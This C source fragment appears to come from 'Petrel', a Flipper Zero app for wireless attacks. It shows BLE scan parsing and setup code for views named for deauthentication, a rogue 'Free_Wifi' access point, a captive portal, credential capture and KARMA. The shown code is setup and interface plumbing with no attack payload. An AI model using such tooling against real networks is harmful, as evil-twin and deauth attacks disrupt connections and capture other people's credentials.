    } else if(strncmp(furi_string_get_cstr(line), "BLE:", 4) == 0) {
        // BLE:<mac>|<rssi>|<name>|<vendor>|<data> -> remember the device for GATT enumerate
        const char* s = furi_string_get_cstr(line) + 4;
        char mac[18] = "";
        const char* p1 = strchr(s, '|');
        if(p1 && (size_t)(p1 - s) < sizeof(mac)) {
            size_t n = (size_t)(p1 - s);
            memcpy(mac, s, n);
            mac[n] = '\0';
        }
        if(mac[0]) {
            char name[24] = "";
            char tag[16] = "";
            // fields after "BLE:": mac | rssi | name | vendor | raw
            const char* p2 = p1 ? strchr(p1 + 1, '|') : NULL; // end of rssi
            const char* p3 = p2 ? strchr(p2 + 1, '|') : NULL; // end of name
            const char* p4 = p3 ? strchr(p3 + 1, '|') : NULL; // end of vendor
            if(p2 && p3) {
                size_t n = (size_t)(p3 - p2 - 1);
                if(n > 23) n = 23;
                memcpy(name, p2 + 1, n);
                name[n] = '\0';
            }
            if(p3 && p4) {
                size_t n = (size_t)(p4 - p3 - 1);
                if(n > 15) n = 15;
                memcpy(tag, p3 + 1, n);
                tag[n] = '\0';
            }
            if(!name[0]) strncpy(name, "(no name)", sizeof(name) - 1);
            bool have = false;
            for(int i = 0; i < ble_list_n; i++)
                if(!strcmp(ble_list_mac[i], mac)) {
                    have = true;
                    break;
                }
            if(!have && ble_list_n < BLE_LIST_MAX) {
                strncpy(ble_list_mac[ble_list_n], mac, sizeof(ble_list_mac[0]) - 1);
                ble_list_name[ble_list_n][0] = '\0';
                strncpy(ble_list_name[ble_list_n], name, sizeof(ble_list_name[0]) - 1);
                ble_list_tag[ble_list_n][0] = '\0';
                strncpy(ble_list_tag[ble_list_n], tag, sizeof(ble_list_tag[0]) - 1);
                ble_list_n++;
            }
        }
        recon_append(s);
    }
}

static void animation_timer_callback(void* context) {
    Petrel* app = context;
    // Timer thread: post only. The frame is built in beacon_info_scene_on_event's
    // PETREL_EVT_ANIM_TICK case, on the GUI thread.
    post_event(app, PETREL_EVT_ANIM_TICK);
}

static Petrel* app_alloc() {
    FURI_LOG_D(TAG, __func__);
    // First, before anything that can produce an event (the UART worker starts inside
    // uart_helper_alloc below, and the timers are created later): the ring's mutex.
    post_head = 0;
    post_tail = 0;
    post_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    furi_check(post_mutex);
    diag_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    furi_check(diag_mutex);
    // Storage worker first, so any line that arrives once the UART worker starts already has
    // somewhere to hand its snapshot.
    storage_head = 0;
    storage_tail = 0;
    storage_dropped = 0;
    storage_status[0] = '\0';
    storage_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    furi_check(storage_mutex);
    storage_run = true;
    storage_thread = furi_thread_alloc_ex("PetrelStorage", 2048, storage_worker, NULL);
    furi_thread_start(storage_thread);
    Petrel* app = malloc(sizeof(Petrel));
    app->ssidAPLength = 32;
    //app->ssidAPLength = 0;
    app->captivePortal = 0;
    app->deauthReason = 2;
    app->mac_type = 1; // default: random AP MAC
    app->securityAP = 0;
    app->channelAP = 9;
    app->ssidAP = malloc(app->ssidAPLength);
    strcpy(app->ssidAP, "Free_Wifi");
    app->passwordAPLength = 64;
    app->passwordAP = malloc(app->passwordAPLength);
    strcpy(app->passwordAP, "password123");
    app->selectedWifi = 0;
    app->wifiCount = 0;
    app->menuIndex = 0;
    app->submenuIndex = 0;
    // rickIndex drives rick[rickIndex] from the animation timer. It used to be first written during
    // teardown only, so a beacon-mode animation started against whatever malloc left in the field -
    // and a negative value stays negative under the timer's % 24 (C truncates toward zero), which is
    // an out-of-bounds icon pointer. Initialise it here.
    app->rickIndex = 0;
    app->fw_version[0] = '\0';
    app->fw_caps[0] = '\0';
    app->ident_attempts = 0;
    app->ident_last_tick = 0;
    app->bleAdvHex[0] = '\0';
    app->ibeaconUuid[0] = '\0';
    app->scene_manager = scene_manager_alloc(&Petrel_scene_manager_handlers, app);
    app->view_dispatcher = view_dispatcher_alloc();
    // Default AP MAC = random (locally administered)
    {
        unsigned char random_mac[6];
        generate_mac_address(random_mac);
        snprintf(
            app->customMac,
            sizeof(app->customMac),
            "%02X:%02X:%02X:%02X:%02X:%02X",
            random_mac[0],
            random_mac[1],
            random_mac[2],
            random_mac[3],
            random_mac[4],
            random_mac[5]);
    }
    parse_mac(app->customMac, app->byte_input_store);

    view_dispatcher_set_event_callback_context(app->view_dispatcher, app);
    view_dispatcher_set_custom_event_callback(app->view_dispatcher, Petrel_custom_callback);
    view_dispatcher_set_navigation_event_callback(
        app->view_dispatcher, Petrel_back_event_callback);

    app->menu = menu_alloc();
    view_dispatcher_add_view(app->view_dispatcher, mainMenuView, menu_get_view(app->menu));

    app->submenu = submenu_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, scannedWifisView, submenu_get_view(app->submenu));
    view_dispatcher_add_view(app->view_dispatcher, beaconListView, submenu_get_view(app->submenu));

    app->text_input = text_input_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, bssidTextInputView, text_input_get_view(app->text_input));
    view_dispatcher_add_view(
        app->view_dispatcher, apNameTextInputView, text_input_get_view(app->text_input));
    view_dispatcher_add_view(
        app->view_dispatcher, apPasswordTextInputView, text_input_get_view(app->text_input));

    app->loading = loading_alloc();
    view_dispatcher_add_view(app->view_dispatcher, loadingView, loading_get_view(app->loading));

    app->widget = widget_alloc();
    // The widget view is registered for several scenes (wifiInfo/evilCreds/beaconInfo/...) and
    // now also receives input (C1 portal picker). Without a context those callbacks get NULL as
    // their context and dereferencing it hard-crashes the Flipper - which is exactly what
    // happened the first time LEFT/RIGHT was pressed on the Trap screen.
    // Do NOT point the widget's view context at the app. widget_alloc() already set it to the
    // Widget* and the widget's own input handler casts it back to Widget* to reach widget->view.
    // Pointing it at app made that read app->scene_manager as a View*, so any key delivered to the
    // widget faulted the device - before the button callback ran. Drawing was unaffected (the draw
    // callback gets the model), which is why the AP info screen rendered perfectly and then reset
    // the Flipper a moment later, when the rest of the OK press (short/release) was routed to it.
    view_set_context(widget_get_view(app->widget), app->widget);
    // NOTE: do NOT view_set_input_callback() on the widget view here. That replaces the widget's
    // own button handling for every screen that shares this view - which silently broke the AP
    // info screen's Edit/Deauth/Evil buttons, and Edit is how the Tools menu is reached.
    // The KARMA/Trap controls are widget buttons instead (see karma_button_cb).
    view_dispatcher_add_view(app->view_dispatcher, wifiInfoView, widget_get_view(app->widget));
    view_dispatcher_add_view(app->view_dispatcher, evilCredsView, widget_get_view(app->widget));
    view_dispatcher_add_view(app->view_dispatcher, beaconInfoView, widget_get_view(app->widget));
    view_dispatcher_add_view(app->view_dispatcher, helpView, widget_get_view(app->widget));
    view_dispatcher_add_view(app->view_dispatcher, pmfView, widget_get_view(app->widget));
    view_dispatcher_add_view(
        app->view_dispatcher, toolsListView, submenu_get_view(app->submenu));

    app->variableList = variable_item_list_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, configAttackView, variable_item_list_get_view(app->variableList));
    view_dispatcher_add_view(
        app->view_dispatcher, configAPView, variable_item_list_get_view(app->variableList));
    view_dispatcher_add_view(
        app->view_dispatcher, settingsView, variable_item_list_get_view(app->variableList));

    app->byteInput = byte_input_alloc();
    view_dispatcher_add_view(
        app->view_dispatcher, aPmacAddresView, byte_input_get_view(app->byteInput));

    // The popup scene draws with the widget (see popup_scene_on_enter), so this slot points at
    // the widget's view. widget_alloc() already set its context to the Widget, and the popup
    // scene must not override it (that mistake cost us the AP info screen for three sessions).
    view_dispatcher_add_view(app->view_dispatcher, popupView, widget_get_view(app->widget));

    // Card-grid main menu
    app->cardView = view_alloc();
    view_allocate_model(app->cardView, ViewModelTypeLockFree, 1); // enable view_commit_model refresh
    view_set_context(app->cardView, app);
    view_set_draw_callback(app->cardView, card_menu_draw);
    view_set_input_callback(app->cardView, card_menu_input);
    view_dispatcher_add_view(app->view_dispatcher, cardMenuView, app->cardView);

    app->chanMapView = view_alloc();
    view_allocate_model(app->chanMapView, ViewModelTypeLocking, sizeof(ChanModel));
    view_set_context(app->chanMapView, app);
    view_set_draw_callback(app->chanMapView, channel_map_draw);
    view_set_input_callback(app->chanMapView, channel_map_input);
    view_dispatcher_add_view(app->view_dispatcher, channelMapView, app->chanMapView);

    // Animated "working" screen (operation name + spinner)
    app->busyView = view_alloc();
    view_allocate_model(app->busyView, ViewModelTypeLockFree, sizeof(BusyModel));
    view_set_context(app->busyView, app);
    view_set_draw_callback(app->busyView, busy_view_draw);
    view_dispatcher_add_view(app->view_dispatcher, busyView, app->busyView);
    app->busyTimer = furi_timer_alloc(busy_timer_cb, FuriTimerTypePeriodic, app);
    app->karmaTimer = furi_timer_alloc(karma_timer_cb, FuriTimerTypePeriodic, app);
    app->scriptTimer = furi_timer_alloc(script_timer_cb, FuriTimerTypePeriodic, app);

    app->uart_lines = furi_message_queue_alloc(64, sizeof(FuriString*));
    furi_check(app->uart_lines);
    app->scan_waiting = false;
    app->scan_deadline = 0;
    // 10 ms, not 1 ms: this callback runs on the dispatcher (GUI) thread, and there is no reason to
    // spend that thread a thousand times a second polling a message queue. Eight lines per tick
    // still keeps up with ~800 lines/s. (An earlier version of this comment blamed the 1 ms tick
    // for dropped key presses. That was wrong: the "drops" were stale screenshot frames - the
    // Flipper only streams a frame when the screen changes. See tools/flip_see.py.)
    view_dispatcher_set_tick_event_callback(
        app->view_dispatcher, uart_gui_tick, furi_ms_to_ticks(10));

    app->uart_helper = uart_helper_alloc();
    uart_helper_set_baud_rate(app->uart_helper, DEVICE_BAUDRATE);
    uart_helper_set_delimiter(app->uart_helper, LINE_DELIMITER, INCLUDE_LINE_DELIMITER);
    // Frame callback first: set_callback() is what starts the worker and RX, so installing it
    // afterwards left a window where binary frames were dropped.
    uart_helper_set_frame_callback(app->uart_helper, petrel_scan_frame); // M0.3: DP_SCAN_AP side-channel
    uart_helper_set_callback(app->uart_helper, uart_enqueue_line, app);
    petrel_ident(app); // A: ask the board to advertise caps (bounded, see petrel_ident)

    app->timer = furi_timer_alloc(animation_timer_callback, FuriTimerTypePeriodic, app);
    return app;
}

